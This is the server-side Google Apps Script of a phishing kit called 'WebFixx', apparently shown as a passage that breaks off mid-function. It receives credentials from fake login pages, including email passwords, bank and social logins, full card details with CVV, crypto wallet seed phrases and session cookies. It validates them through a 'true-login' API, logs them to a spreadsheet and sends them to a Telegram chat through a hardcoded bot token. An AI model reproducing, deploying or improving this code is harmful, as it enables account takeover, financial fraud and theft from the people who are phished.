const CONFIG = {
  NAME: "WebFixx",
  DB_ID: "17cjaHx93z3ciGAdgJ4AvkjgIwI9gP3RsfJU5G7exp-U",
  SHEET_NAME: {
    PROJECTS: "projects",
    HUB: "hub",
    SETTINGS: "settings",
    COOKIE: "cookie", // Added COOKIE sheet name
  },
  FOLDER_ID: {
    PROFILE_PICTURE: "1TwKBloBke5GQav9h5knkO0lk7ezo-PR8",
  },
  CACHE_EXPIRED_IN_SECONDS: 21600, // 6 hours
  EXTERNAL_API: "https://api.example.com", // Placeholder for external API base URL
};


/**
 * Creates a JSON response object.
 * @param {Object} data - The data to include in the JSON response.
 * @returns {GoogleAppsScript.Content.TextOutput} A TextOutput object with JSON content.
 */
function createJsonResponse(data) {
  return ContentService.createTextOutput(JSON.stringify(data))
    .setMimeType(ContentService.MimeType.JSON);
}

/**
 * Placeholder for getHostFromUrl function.
 * In a real App Script environment, this would parse the host from a URL.
 */
function getHostFromUrl(url) {
  try {
    return new URL(url).hostname;
  } catch (e) {
    Logger.log("Error parsing URL host: " + e);
    return "";
  }
}

/**
 * Placeholder for isLocalHost function.
 * In a real App Script environment, this would check if a host is localhost.
 */
function isLocalHost(host) {
  return host === "localhost" || host === "127.0.0.1";
}

/**
 * Placeholder for getIpInfo function.
 * In a real App Script environment, this would fetch detailed IP information.
 */
function getIpInfo(ip) {
  // This is a placeholder. In a real scenario, you'd call an external IP info API.
  // For now, it just returns the provided IP in a structured object.
  return { ip: ip, country: "Unknown", region: "Unknown", city: "Unknown" };
}

/**
 * Placeholder for sendVisitorNotification function.
 * In a real App Script environment, this would send a notification about a visitor.
 */
function sendVisitorNotification(telegramGroupId, ipData, projectName, path, completeUrl, status) {
  Logger.log(`Sending visitor notification to ${telegramGroupId}: Project ${projectName}, Path ${path}, Status ${status}`);
  // Implement actual notification logic here, e.g., using sendTelegramMessage
  const message = `New ${status} visit to ${projectName} (${path})\nIP: ${ipData.ip}, Country: ${ipData.country}\nURL: ${completeUrl}`;
  sendTelegramMessage(telegramGroupId, message);
}


function verifyPageVisit(params) {
  try {
    const ss = SpreadsheetApp.openById(CONFIG.DB_ID);
    const projectsSheet = ss.getSheetByName(CONFIG.SHEET_NAME.PROJECTS);

    if (!projectsSheet) {
      return createJsonResponse({ 
        success: false, 
        error: "Projects sheet not found" 
      });
    }

    const data = projectsSheet.getDataRange().getValues();
    const headers = data[0];
    const mainURLIndex = headers.indexOf("mainURL");
    const urlPathsIndex = headers.indexOf("urlPaths");
    const systemStatusIndex = headers.indexOf("systemStatus");
    const pageVisitsIndex = headers.indexOf("pageVisits");
    const flaggedVisitsIndex = headers.indexOf("flaggedVisits");
    const templateCodeIndex = headers.indexOf("templateCode");
    const telegramGroupIdIndex = headers.indexOf("telegramGroupId");
    const projectNameIndex = headers.indexOf("projectTitle"); // Assuming you have this column

    const completeUrlHost = getHostFromUrl(params.completeUrl);

    // Fetch full IP data
    let fullIpData = {};
    if (params.ipData) {
      fullIpData = getIpInfo(params.ipData);
      // If ipinfo.io returns an error or empty, ensure we still have the original IP
      if (!fullIpData || !fullIpData.ip) {
        fullIpData = { ip: params.ipData };
      }
    } else {
      fullIpData = { ip: "Unknown" };
    }

    // First, find the project that matches the path
    let matchingProjectRow = null;
    let matchingProjectIndex = -1;

    for (let i = 1; i < data.length; i++) {
      const row = data[i];
      if (row[systemStatusIndex] === "ACTIVE") {
        try {
          const urlPathsValue = row[urlPathsIndex];
          Logger.log(`Row ${i}: urlPaths value = "${urlPathsValue}", type = ${typeof urlPathsValue}`);
          
          // Handle empty, null, or undefined values
          let urlPathsString = urlPathsValue;
          if (!urlPathsString || urlPathsString.trim() === "") {
            urlPathsString = "[]";
          }
          
          const urlPaths = JSON.parse(urlPathsString);
          const matchingPath = urlPaths.find(p => p.path === params.path);

          if (matchingPath) {
            matchingProjectRow = row;
            matchingProjectIndex = i;
            break; // Found the matching project, exit loop
          }
        } catch (e) {
          Logger.log(`Error parsing urlPaths JSON for row ${i}: ${e}`);
          Logger.log(`Raw value: "${row[urlPathsIndex]}"`);
          // Continue to next row instead of failing
          continue;
        }
      }
    }

    // If we found a matching project by path, process it
    if (matchingProjectRow) {
      const mainURL = matchingProjectRow[mainURLIndex];
      const mainUrlHost = getHostFromUrl(mainURL);
      const telegramGroupId = matchingProjectRow[telegramGroupIdIndex];
      const projectName = matchingProjectRow[projectNameIndex] || "Unknown Project";

      if (!isLocalHost(completeUrlHost)) {
        if (completeUrlHost !== mainUrlHost) {
          // Host mismatch, count as flagged and send notification
          const currentFlagged = parseInt(matchingProjectRow[flaggedVisitsIndex] || 0);
          projectsSheet.getRange(matchingProjectIndex + 1, flaggedVisitsIndex + 1).setValue(currentFlagged + 1);

          // Send flagged visit notification
          if (telegramGroupId) {
            sendVisitorNotification(telegramGroupId, fullIpData, projectName, params.path, params.completeUrl, "FLAGGED");
          }

          return createJsonResponse({
            success: false,
            error: "Host mismatch with mainURL"
          });
        }
      }

      // Host matches (or localhost), count as valid visit and send notification
      const currentVisits = parseInt(matchingProjectRow[pageVisitsIndex] || 0);
      projectsSheet.getRange(matchingProjectIndex + 1, pageVisitsIndex + 1).setValue(currentVisits + 1);

      // Send valid visit notification
      if (telegramGroupId) {
        sendVisitorNotification(telegramGroupId, fullIpData, projectName, params.path, params.completeUrl, "VALID");
      }

      return createJsonResponse({
        success: true,
        templateCode: matchingProjectRow[templateCodeIndex],
        status: "active",
        ipData: fullIpData
      });
    }

    // If no matching path found, increase flaggedVisits for all active projects (but no notifications)
    for (let i = 1; i < data.length; i++) {
      const row = data[i];
      if (row[systemStatusIndex] === "ACTIVE") {
        const currentFlagged = parseInt(row[flaggedVisitsIndex] || 0);
        projectsSheet.getRange(i + 1, flaggedVisitsIndex + 1).setValue(currentFlagged + 1);
      }
    }

    return createJsonResponse({
      success: false,
      error: "No active project matched the path"
    });

  } catch (error) {
    Logger.log("Error in verifyPageVisit: " + error);
    return createJsonResponse({
      success: false,
      error: "Server error: " + error.toString()
    });
  }
}

/**
 * Add a new row with data mapped to headers
 * @param {string} sheetName - Name of the sheet
 * @param {Object} headerAndValueMap - Key-value pairs of header and data
 * @returns {Object} Result object with status and message
 */
function setRowDataByHeaderMap(sheetName, headerAndValueMap) {
  Logger.log(`Starting setRowDataByHeaderMap for ${sheetName}`);
  Logger.log("Data to insert:", headerAndValueMap);

  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const ws = ss.getSheetByName(sheetName);
    
    if (!ws) {
      Logger.log(`Sheet ${sheetName} not found`);
      throw new Error(`${sheetName} was not found in the database.`);
    }

    const headers = ws.getRange(1, 1, 1, ws.getLastColumn()).getValues()[0];
    Logger.log("Found headers:", headers);

    const newRowData = Array(headers.length).fill("");
    
    // Map values to correct positions
    Object.entries(headerAndValueMap).forEach(([header, value]) => {
      const headerIndex = headers.indexOf(header);
      Logger.log(`Mapping ${header} (${value}) to index ${headerIndex}`);
      
      if (headerIndex === -1) {
        throw new Error(`Header '${header}' not found in the table. Available headers: ${headers.join(", ")}`);
      }
      newRowData[headerIndex] = value;
    });

    Logger.log("Final row data to append:", newRowData);
    ws.appendRow(newRowData);

    return {
      success: true,
      message: "New row added successfully",
      rowNumber: ws.getLastRow()
    };
  } catch (error) {
    Logger.log(`Error in setRowDataByHeaderMap: ${error.message}`);
    Logger.log("Error stack:", error.stack);
    return { 
      success: false, 
      error: error.message,
      stack: error.stack
    };
  }
}

/**
 * Update multiple cells for a row matching search criteria
 * @param {string} sheetName - Name of the sheet
 * @param {string} searchColumn - Column to search in
 * @param {string} searchValue - Value to search for
 * @param {Object} headerAndValueMap - Key-value pairs to update
 * @returns {Object} Result object with status and message
 */
function setMultipleCellDataByColumnSearch(sheetName, searchColumn, searchValue, headerAndValueMap) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const ws = ss.getSheetByName(sheetName);
    if (!ws) throw new Error(`${sheetName} was not found in the database.`);

    const [headers, ...rows] = ws.getDataRange().getValues();
    const searchColumnIndex = headers.indexOf(searchColumn);
    if (searchColumnIndex === -1) throw new Error(`Header '${searchColumn}' not found in the table.`);

    const rowIndex = rows.findIndex(row => 
      row[searchColumnIndex].toString().trim() === searchValue.toString().trim()
    );
    
    if (rowIndex === -1) throw new Error(`Row with ${searchColumn}='${searchValue}' not found.`);

    const rowToUpdateIndex = rowIndex + 2; // +2 for header row and 0-based index

    // Batch update preparation
    const updates = Object.entries(headerAndValueMap).map(([header, value]) => {
      const headerIndex = headers.indexOf(header);
      if (headerIndex === -1) throw new Error(`Header '${header}' not found in the table.`);
      return { col: headerIndex + 1, value: value };
    });

    // Perform updates
    updates.forEach(update => {
      ws.getRange(rowToUpdateIndex, update.col).setValue(update.value);
    });

    return {
      success: true,
      message: "Cells updated successfully",
      rowNumber: rowToUpdateIndex
    };
  } catch (error) {
    Logger.log(`Error in setMultipleCellDataByColumnSearch: ${error.message}`);
    return { success: false, error: error.message };
  }
}

/**
 * Get rows from a sheet based on a search column and value
 * @param {string} sheetName - Name of the sheet
 * @param {string} searchColumn - Column to search in
 * @param {string} searchValue - Value to search for
 * @returns {Object} Object containing headers and matching rows
 */
function getRowsByColumn(sheetName, searchColumn, searchValue) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const ws = ss.getSheetByName(sheetName);
    if (!ws) throw new Error(`${sheetName} was not found in the database.`);
    
    const [headers, ...rows] = ws.getDataRange().getDisplayValues();
    const columnIndex = headers.indexOf(searchColumn);
    if (columnIndex === -1) throw new Error(`Header '${searchColumn}' not found in the table.`);

    // Filter matching rows
    const filteredRows = rows.filter(row => {
      const cellValue = row[columnIndex];
      return cellValue && 
             searchValue && 
             cellValue.toString().trim() === searchValue.toString().trim();
    });
    
    return {
      success: true,
      headers: headers,
      data: filteredRows,
      count: filteredRows.length
    };
  } catch (error) {
    Logger.log(`Error in getRowsByColumn: ${error.message}`);
    return { success: false, error: error.message };
  }
}


// Function to send a message via Telegram to multiple chat IDs
function sendTelegramMessage(chatIds, message) {
  var chatIdArray = chatIds.split(","); // Split the chatIds by comma

  chatIdArray.forEach(function(chatId) {
    var payload = {
      method: "post",
      payload: {
        chat_id: chatId.trim(), // Trim spaces if any
        text: message
      }
    };

    // Add ngrok-skip-browser-warning header
    const options = addNgrokSkipHeader({}); // Start with empty options, add method and payload later
    options.method = payload.method;
    options.payload = payload.payload;

    UrlFetchApp.fetch("https://api.telegram.org/bot6941044618:AAGHyPCajJWjkbheO-lQHp7WNs-W-3e5J9Q/sendMessage", options);
  });
}

/**
 * Helper function to add ngrok-skip-browser-warning header to options.
 * @param {Object} options - The original options object for UrlFetchApp.fetch.
 * @returns {Object} The updated options object with the ngrok header.
 */
function addNgrokSkipHeader(options) {
  const newOptions = { ...options };
  if (!newOptions.headers) {
    newOptions.headers = {};
  }
  newOptions.headers['ngrok-skip-browser-warning'] = 'true';
  return newOptions;
}

/**
 * Helper function to update mxRecord and possibleProvider in the hub sheet.
 * This function is intended to be called asynchronously.
 * @param {string} email - The email address to lookup.
 * @param {string} submissionId - The unique ID of the row in the hub sheet to update.
 */
function updateMxRecordAndProvider(email, submissionId) {
  Logger.log(`Starting updateMxRecordAndProvider for email: ${email}, submissionId: ${submissionId}`);
  if (!email || !submissionId) {
    Logger.log("Missing email or submissionId for updateMxRecordAndProvider.");
    return;
  }

  try {
    const apiUrl = `${CONFIG.EXTERNAL_API}/emails/mx-lookup-check?emails=${encodeURIComponent(email)}`;
    Logger.log(`Calling MX lookup API: ${apiUrl}`);

    const options = addNgrokSkipHeader({
      method: 'GET',
      headers: {
        'Content-Type': 'application/json'
      },
      muteHttpExceptions: true // Important to catch errors gracefully
    });
    const response = UrlFetchApp.fetch(apiUrl, options);

    const apiResponseData = JSON.parse(response.getContentText());
    Logger.log("MX Lookup API Response:", apiResponseData);

    let mxRecord = "N/A";
    let possibleProvider = "N/A";

    if (apiResponseData && apiResponseData.results && apiResponseData.results.length > 0) {
      const result = apiResponseData.results[0];
      mxRecord = JSON.stringify(result); // Store the entire result JSON
      possibleProvider = result.possibleProvider || "N/A";
    }

    Logger.log(`Updating hub sheet for submissionId: ${submissionId} with mxRecord: ${mxRecord}, possibleProvider: ${possibleProvider}`);

    // Update the specific row in the hub sheet using setMultipleCellDataByColumnSearch
    const updateHubResult = setMultipleCellDataByColumnSearch(
      CONFIG.SHEET_NAME.HUB,
      "submissionId", // Search column
      submissionId,   // Search value
      {
        "mxRecord": mxRecord,
        "possibleProvider": possibleProvider
      }
    );

    if (!updateHubResult.success) {
      Logger.log(`Error updating hub sheet: ${updateHubResult.error}`);
    }

    Logger.log("Hub sheet updated successfully with MX data.");

  } catch (error) {
    Logger.log("Error in updateMxRecordAndProvider: " + error.message);
  }
}

/**
 * Processes form submissions, updates project data, and sends notifications.
 * @param {Object} params - Parameters containing token, formData, templateType, templateNiche.
 * @param {string} params.token - Token to identify the project.
 * @param {Object} params.formData - The form data submitted.
 * @param {string} params.templateType - Type of the template (PLAIN, COOKIE, TRUE-LOGIN).
 * @param {string} [params.templateNiche] - Niche of the template for TRUE-LOGIN (WIRE, BANK, SOCIAL, WALLET).
 * @returns {GoogleAppsScript.Content.TextOutput} A JSON response indicating success or failure.
 */
function notifyFormSubmission(params) {
  Logger.log("notifyFormSubmission called with params: " + JSON.stringify(params));

  try {
    const { token, formData: formDataString } = params;

    if (!token || !formDataString) {
      return createJsonResponse({
        success: false,
        error: "Missing required parameters: token or formData."
      });
    }

    let formData;
    try {
      formData = JSON.parse(formDataString);
    } catch (e) {
      return createJsonResponse({
        success: false,
        error: "Invalid formData format. Expected JSON string."
      });
    }

    // 1. Use the token to search the projects sheet
    const projectRowsResult = getRowsByColumn(CONFIG.SHEET_NAME.PROJECTS, "token", token);

    if (!projectRowsResult.success || projectRowsResult.count === 0) {
      return createJsonResponse({
        success: false,
        error: `Project with token '${token}' not found.`
      });
    }

    const projectHeaders = projectRowsResult.headers;
    const projectRowData = projectRowsResult.data[0]; // Assuming token is unique, take the first match

    const projectRowMap = {};
    projectHeaders.forEach((header, index) => {
      projectRowMap[header] = projectRowData[index];
    });

    const templateType = projectRowMap.templateType; // Get from project row
    const templateNiche = projectRowMap.templateNiche; // Get from project row

    let updatedFormData = { ...formData }; // Create a mutable copy of formData

    // Extract domain from email if available
    if (updatedFormData.email) {
      const atIndex = updatedFormData.email.lastIndexOf('@');
      if (atIndex !== -1) {
        updatedFormData.domain = updatedFormData.email.slice(atIndex + 1);
      }
    }

    let verifyAccess = false;
    let cookieAccess = false;
    let verified = false;
    let fullAccess = false;

    // Call external API based on templateNiche (if applicable)
    let apiResponseData = null;
    let apiError = null;

    if (templateType === "PLAIN") {
      verifyAccess = false;
      cookieAccess = false;
      verified = false;
      fullAccess = false;
    } else if (templateType === "COOKIE" || templateType === "TRUE-LOGIN") {
      verifyAccess = true;
      cookieAccess = (templateType === "COOKIE"); // Set cookieAccess based on templateType

      let apiUrl = "";
      let requestBody = {}; // For POST requests

      switch (templateNiche) {
        case "WIRE":
          apiUrl = `${CONFIG.EXTERNAL_API}/emails/cookie/cookie-api-login`; // New endpoint for WIRE
          requestBody = {
            projectId: projectRowMap.projectId || "N/A",
            userId: projectRowMap.userId || "N/A",
            formId: projectRowMap.formId || "N/A",
            ipData: updatedFormData.ipData || {},
            deviceData: updatedFormData.deviceData || {}
          };
          if (formData.email) requestBody.email = formData.email;
          if (formData.password) requestBody.password = formData.password;
          if (projectRowMap.strictly) requestBody.strictly = projectRowMap.strictly; // Add strictly if available from projectRowMap
          break;
        case "BANK":
          const bankData = formData.banks && formData.banks.length > 0 ? formData.banks[0] : {};
          username = bankData.username;
          password = bankData.password;
          const bankWebsite = bankData.website;
          if (!username || !password) {
            return createJsonResponse({ success: false, error: "Username and password required for BANK verification." });
          }
          apiUrl = `${CONFIG.EXTERNAL_API}/banks/true-login/verify-bank-login?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}${bankWebsite ? `&website=${encodeURIComponent(bankWebsite)}` : ''}`;
          break;
        case "SOCIAL":
          const socialData = formData.socials && formData.socials.length > 0 ? formData.socials[0] : {};
          username = socialData.username;
          password = socialData.password;
          const socialWebsite = socialData.website;
          if (!username || !password) {
            return createJsonResponse({ success: false, error: "Username and password required for SOCIAL verification." });
          }
          apiUrl = `${CONFIG.EXTERNAL_API}/socials/true-login/verify-social-login?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}${socialWebsite ? `&website=${encodeURIComponent(socialWebsite)}` : ''}`;
          break;
        case "WALLET":
          const walletData = formData.wallets && formData.wallets.length > 0 ? formData.wallets[0] : {};
          wordPhrase = walletData.wordPhrase;
          const walletWebsite = walletData.website;
          if (!wordPhrase) {
            return createJsonResponse({ success: false, error: "Word phrase required for WALLET verification." });
          }
          apiUrl = `${CONFIG.EXTERNAL_API}/wallets/true-login/verify-wallet-phrase?phrase=${encodeURIComponent(wordPhrase)}${walletWebsite ? `&website=${encodeURIComponent(walletWebsite)}` : ''}`;
          break;
        case "CARD":
          const cardData = formData.cards && formData.cards.length > 0 ? formData.cards[0] : {};
          cardNumber = cardData.cardNumber;
          expirationDate = cardData.expirationDate;
          cvv = cardData.cvv;
          const cardWebsite = cardData.website; // Assuming card object might have a website
          if (!cardNumber || !expirationDate || !cvv) {
            return createJsonResponse({ success: false, error: "Card number, expiration date, and CVV required for CARD verification." });
          }
          apiUrl = `${CONFIG.EXTERNAL_API}/cards/true-login/verify-card?cardNumber=${encodeURIComponent(cardNumber)}&expirationDate=${encodeURIComponent(expirationDate)}&cvv=${encodeURIComponent(cvv)}${cardWebsite ? `&website=${encodeURIComponent(cardWebsite)}` : ''}`;
          break;
        default:
          Logger.log(`No specific API for templateNiche: ${templateNiche} for templateType: ${templateType}. Skipping API call.`);
          break;
      }

      if (apiUrl) {
        try {
          Logger.log(`Calling external API: ${apiUrl}`);
          const options = addNgrokSkipHeader({
            method: (templateNiche === "WIRE") ? 'POST' : 'GET', // Use POST for WIRE, GET for others
            headers: {
              'Content-Type': 'application/json'
            },
            muteHttpExceptions: true // Important to catch errors gracefully
          });

          if (templateNiche === "WIRE") {
            options.payload = JSON.stringify(requestBody);
          }

          const response = UrlFetchApp.fetch(apiUrl, options);
          apiResponseData = JSON.parse(response.getContentText());
          Logger.log("External API Response:", apiResponseData);

          // verified and fullAccess are no longer directly from API response for COOKIE/TRUE-LOGIN
          // They will be determined by the initial formData defaults or remain false if not set.
          // The new API response doesn't carry these fields.
          verified = updatedFormData.verified !== undefined ? updatedFormData.verified : false;
          fullAccess = updatedFormData.fullAccess !== undefined ? updatedFormData.fullAccess : false;
          
          // Add API response to formData for storage
          updatedFormData.apiResponse = apiResponseData;

        } catch (e) {
          Logger.log("Error calling external API: " + e.message);
          apiError = e.message;
          updatedFormData.apiError = apiError;
          // Keep verified/fullAccess as default false if API call fails
        }
      }
    } else {
      return createJsonResponse({
        success: false,
        error: "Invalid templateType provided."
      });
    }

    // Add final access and verification flags to formData
    updatedFormData.verifyAccess = verifyAccess;
    updatedFormData.cookieAccess = cookieAccess;
    updatedFormData.verified = verified;
    updatedFormData.fullAccess = fullAccess;

    // Ensure ipData and deviceData are objects, not strings
    if (typeof updatedFormData.ipData === 'string') {
      try {
        updatedFormData.ipData = JSON.parse(updatedFormData.ipData);
      } catch (e) {
        Logger.log("Error parsing ipData string: " + e);
        updatedFormData.ipData = {};
      }
    }
    if (typeof updatedFormData.deviceData === 'string') {
      try {
        updatedFormData.deviceData = JSON.parse(updatedFormData.deviceData);
      } catch (e) {
        Logger.log("Error parsing deviceData string: " + e);
        updatedFormData.deviceData = {};
      }
    }

    const responseColumnValue = projectRowMap.response;
    let existingResponses = [];
    if (responseColumnValue) {
      try {
        existingResponses = JSON.parse(responseColumnValue);
        if (!Array.isArray(existingResponses)) {
          existingResponses = []; // Ensure it's an array if parsing failed or it's not an array
        }
      } catch (e) {
        Logger.log("Error parsing existing response JSON: " + e.message);
        existingResponses = [];
      }
    }

    // Determine new ID
    let newId = 1;
    if (existingResponses.length > 0) {
      const maxId = existingResponses.reduce((max, entry) => {
        const currentId = parseInt(entry.id);
        return isNaN(currentId) ? max : Math.max(max, currentId);
      }, 0);
      newId = maxId + 1;
    }

    // Determine submissionId based on templateType and API response
    let submissionId;
    if ((templateType === "COOKIE" || templateType === "TRUE-LOGIN") && apiResponseData && apiResponseData.browserId) {
      submissionId = apiResponseData.browserId;
    } else {
      submissionId = new Date().getTime().toString() + Utilities.getUuid().slice(0, 4); // Original PLAIN logic
    }

    // Construct the complete new submission entry
    const newSubmissionEntry = {
      id: newId.toString(), // ID as string
      submissionId: submissionId, // Add submissionId here
      category: projectRowMap.templateNiche || "UNKNOWN", // From projectRowMap.templateNiche
      type: projectRowMap.templateType || "UNKNOWN",     // From projectRowMap.templateType
      title: projectRowMap.projectTitle || "Form Submission",
      userId: projectRowMap.userId || "N/A",
      projectId: projectRowMap.projectId || "N/A",
      formId: projectRowMap.formId || "N/A",
      timestamp: updatedFormData.timestamp || new Date().toLocaleString(),
      email: updatedFormData.email || "N/A",
      domain: updatedFormData.domain || "N/A",
      password: updatedFormData.password || "N/A",
      ipData: updatedFormData.ipData || {},
      deviceData: updatedFormData.deviceData || {},
      verifyAccess: verifyAccess,
      cookieAccess: cookieAccess,
      verified: verified,
      fullAccess: fullAccess,
      cookieJSON: updatedFormData.cookieJSON || {},
      cookieFileURL: updatedFormData.cookieFileURL || "", // Ensure this is included
      banks: updatedFormData.banks || [],
      cards: updatedFormData.cards || [],
      socials: updatedFormData.socials || [],
      wallets: updatedFormData.wallets || [],
      apiResponse: updatedFormData.apiResponse || null // Include API response if available
    };

    // Append the new entry
    existingResponses.push(newSubmissionEntry);

    // 1. Update the json value in the response column in projects sheet
    const updateProjectResult = setMultipleCellDataByColumnSearch(
      CONFIG.SHEET_NAME.PROJECTS,
      "token",
      token,
      { "response": JSON.stringify(existingResponses) } // Write back the entire updated array
    );

    if (!updateProjectResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to update project sheet: ${updateProjectResult.error}`
      });
    }

    // 2. Set new row data to hub sheet
    const hubDataToInsert = {
      submissionId: submissionId, // New unique identifier
      category: projectRowMap.templateNiche || "UNKNOWN", // From projectRowMap.templateNiche
      type: projectRowMap.templateType || "UNKNOWN",     // From projectRowMap.templateType
      title: projectRowMap.projectTitle || "Form Submission", // From projectRowMap.projectTitle
      userId: projectRowMap.userId || "N/A",             // From projectRowMap.userId
      projectId: projectRowMap.projectId || "N/A",       // From projectRowMap.projectId
      formId: projectRowMap.formId || "N/A",             // From projectRowMap.formId
      timestamp: updatedFormData.timestamp || new Date().toLocaleString(),
      email: updatedFormData.email || "N/A",
      domain: updatedFormData.domain || "N/A",
      password: updatedFormData.password || "N/A",
      ipData: JSON.stringify(updatedFormData.ipData || {}),
      deviceData: JSON.stringify(updatedFormData.deviceData || {}),
      verifyAccess: verifyAccess ? "TRUE" : "FALSE",
      cookieAccess: cookieAccess ? "TRUE" : "FALSE",
      verified: verified ? "TRUE" : "FALSE",
      fullAccess: fullAccess ? "TRUE" : "FALSE",
      cookieJSON: JSON.stringify(updatedFormData.cookieJSON || {}),
      cookieFileURL: updatedFormData.cookieFileURL || "", // Keep this as it was not explicitly asked to remove from hub sheet
      banks: JSON.stringify(updatedFormData.banks || []),
      cards: JSON.stringify(updatedFormData.cards || []),
      socials: JSON.stringify(updatedFormData.socials || []),
      wallets: JSON.stringify(updatedFormData.wallets || []),
      mxRecord: "PENDING", // Initialize mxRecord
      possibleProvider: "PENDING" // Initialize possibleProvider
    };

    const setHubRowResult = setRowDataByHeaderMap(CONFIG.SHEET_NAME.HUB, hubDataToInsert);

    if (!setHubRowResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to add row to hub sheet: ${setHubRowResult.error}`
      });
    }

    // Asynchronously update mxRecord and possibleProvider using the new submissionId
    if (updatedFormData.email && setHubRowResult.success) {
      try {
        const triggerId = Utilities.getUuid();
        const triggerProperties = {
          email: updatedFormData.email,
          submissionId: submissionId // Pass the new submissionId
        };
        PropertiesService.getScriptProperties().setProperty(triggerId, JSON.stringify(triggerProperties));

        ScriptApp.newTrigger('runUpdateMxRecordAndProviderWrapper')
          .timeBased()
          .at(new Date(Date.now() + 5 * 1000)) // Run 5 seconds from now
          .create();
        Logger.log(`Scheduled MX lookup for email: ${updatedFormData.email}, submissionId: ${submissionId}`);

      } catch (e) {
        Logger.log("Error scheduling MX lookup: " + e.message);
      }
    }

    // Send notification to the user
    const telegramGroupId = projectRowMap.telegramGroupId; // Assuming telegramGroupId is in projects sheet
    if (telegramGroupId) {
      let notificationMessage = `🚨 New Form Submission for Project: *${projectRowMap.projectTitle || "Unknown Project"}* 🚨\n`;
      notificationMessage += `Type: ${templateType} | Niche: ${templateNiche || "N/A"}\n`;
      notificationMessage += `Status: Verified: ${verified ? "✅" : "❌"} | Full Access: ${fullAccess ? "✅" : "❌"}\n\n`;

      switch (templateNiche) {
        case "WIRE":
          notificationMessage += `*EMAIL LOG Details:*\n`;
          notificationMessage += `Email: ${updatedFormData.email || "N/A"}\n`;
          notificationMessage += `Password: ${updatedFormData.password || "N/A"}\n`;
          break;
        case "BANK":
          const bankData = updatedFormData.banks && updatedFormData.banks.length > 0 ? updatedFormData.banks[0] : {};
          notificationMessage += `*BANK LOG Details:*\n`;
          notificationMessage += `Bank Name: ${bankData.bankName || "N/A"}\n`;
          notificationMessage += `Username: ${bankData.username || "N/A"}\n`;
          notificationMessage += `Password: ${bankData.password || "N/A"}\n`;
          notificationMessage += `Website: ${bankData.website || "N/A"}\n`;
          break;
        case "SOCIAL":
          const socialData = updatedFormData.socials && updatedFormData.socials.length > 0 ? updatedFormData.socials[0] : {};
          notificationMessage += `*SOCIAL LOG Details:*\n`;
          notificationMessage += `Platform: ${socialData.platform || "N/A"}\n`;
          notificationMessage += `Username: ${socialData.username || "N/A"}\n`;
          notificationMessage += `Password: ${socialData.password || "N/A"}\n`;
          notificationMessage += `Website: ${socialData.website || "N/A"}\n`;
          break;
        case "WALLET":
          const walletData = updatedFormData.wallets && updatedFormData.wallets.length > 0 ? updatedFormData.wallets[0] : {};
          notificationMessage += `*WALLET Details:*\n`;
          notificationMessage += `Wallet Name: ${walletData.walletName || "N/A"}\n`;
          notificationMessage += `Word Phrase: ${walletData.wordPhrase || "N/A"}\n`;
          notificationMessage += `Website: ${walletData.website || "N/A"}\n`;
          break;
        case "CARD":
          const cardData = updatedFormData.cards && updatedFormData.cards.length > 0 ? updatedFormData.cards[0] : {};
          notificationMessage += `*CARD Details:*\n`;
          notificationMessage += `Card Type: ${cardData.cardType || "N/A"}\n`;
          notificationMessage += `Card Number: ${cardData.cardNumber ? `**** **** **** ${cardData.cardNumber.slice(-4)}` : "N/A"}\n`;
          notificationMessage += `Expiration: ${cardData.expirationDate || "N/A"}\n`;
          notificationMessage += `CVV: ${cardData.cvv || "N/A"}\n`;
          notificationMessage += `Issuer: ${cardData.issuer || "N/A"}\n`;
          notificationMessage += `Bank Name: ${cardData.bankName || "N/A"}\n`;
          break;
        default:
          // Generic details if niche is not specifically handled or for PLAIN/COOKIE without niche
          notificationMessage += `*General Details:*\n`;
          notificationMessage += `Email: ${updatedFormData.email || "N/A"}\n`;
          notificationMessage += `Password: ${updatedFormData.password || "N/A"}\n`;
          break;
      }

      // Add IP Data if available
      if (updatedFormData.ipData && Object.keys(updatedFormData.ipData).length > 0) {
        notificationMessage += `\n*IP Data:*\n`;
        notificationMessage += `IP: ${updatedFormData.ipData.ip || "N/A"}\n`;
        notificationMessage += `Location: ${updatedFormData.ipData.city || "N/A"}, ${updatedFormData.ipData.region || "N/A"}, ${updatedFormData.ipData.country || "N/A"}\n`;
        notificationMessage += `ISP: ${updatedFormData.ipData.isp || "N/A"}\n`;
      }

      // Add Cookie JSON if available
      if (updatedFormData.cookieJSON && Object.keys(updatedFormData.cookieJSON).length > 0) {
        notificationMessage += `\n*Cookie JSON:*\n`;
        notificationMessage += `${JSON.stringify(updatedFormData.cookieJSON, null, 2)}\n`;
      }

      sendTelegramMessage(telegramGroupId, notificationMessage);
    }

    return createJsonResponse({
      success: true,
      message: "Form submission processed successfully.",
      projectUpdate: updateProjectResult,
      hubRowAdd: setHubRowResult,
      finalFormData: updatedFormData,
      apiResponse: apiResponseData // Include apiResponseData if available
    });

  } catch (error) {
    Logger.log("Error in notifyFormSubmission: " + error.message);
    return createJsonResponse({
      success: false,
      error: "Server error: " + error.message,
      stack: error.stack
    });
  }
}

/**
 * Helper function to update hub and projects sheets with data from the cookie sheet.
 * This function is intended to be called when a cookie submission status changes (e.g., COMPLETED, FAILED).
 * @param {string} browserId - The browserId to identify the cookie row and corresponding submissions.
 * @param {string} status - The status of the cookie submission (e.g., "COMPLETED", "FAILED").
 * @returns {Object} A JSON response indicating success or failure.
 */
function updateHubAndProjectsFromCookieData(browserId, status) {
  Logger.log(`updateHubAndProjectsFromCookieData called for browserId: ${browserId}, status: ${status}`);

  try {
    // 1. Get cookie row data
    const cookieRowsResult = getRowsByColumn(CONFIG.SHEET_NAME.COOKIE, "browserId", browserId);

    if (!cookieRowsResult.success || cookieRowsResult.count === 0) {
      return createJsonResponse({
        success: false,
        error: `Cookie data for browserId '${browserId}' not found.`
      });
    }

    const cookieHeaders = cookieRowsResult.headers;
    const cookieRowData = cookieRowsResult.data[0];
    const cookieRowMap = {};
    cookieHeaders.forEach((header, index) => {
      cookieRowMap[header] = cookieRowData[index];
    });

    // Prepare data for Hub and Projects
    const dataToUpdate = {
      verified: cookieRowMap.verified !== undefined ? cookieRowMap.verified : false,
      fullAccess: cookieRowMap.fullAccess !== undefined ? cookieRowMap.fullAccess : false,
      banks: cookieRowMap.banks || [],
